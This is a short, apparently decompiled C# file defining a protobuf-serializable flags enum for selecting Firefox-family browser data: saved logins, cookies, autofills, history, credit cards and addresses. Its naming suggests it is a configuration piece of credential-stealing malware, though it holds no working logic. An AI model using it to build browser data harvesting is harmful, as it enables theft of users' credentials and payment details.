

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[Flags]
	[ProtoContract]
	public enum GeckoBrowserOptions
	{
		None = 0,
		Logins = 1,
		Cookies = 2,
		Autofills = 4,
		Downloads = 8,
		History = 16, // 0x00000010
		CreditCards = 32, // 0x00000020
		Addresses = 64, // 0x00000040
		All = Addresses | CreditCards | History | Downloads | Autofills | Cookies | Logins, // 0x0000007F
	}
}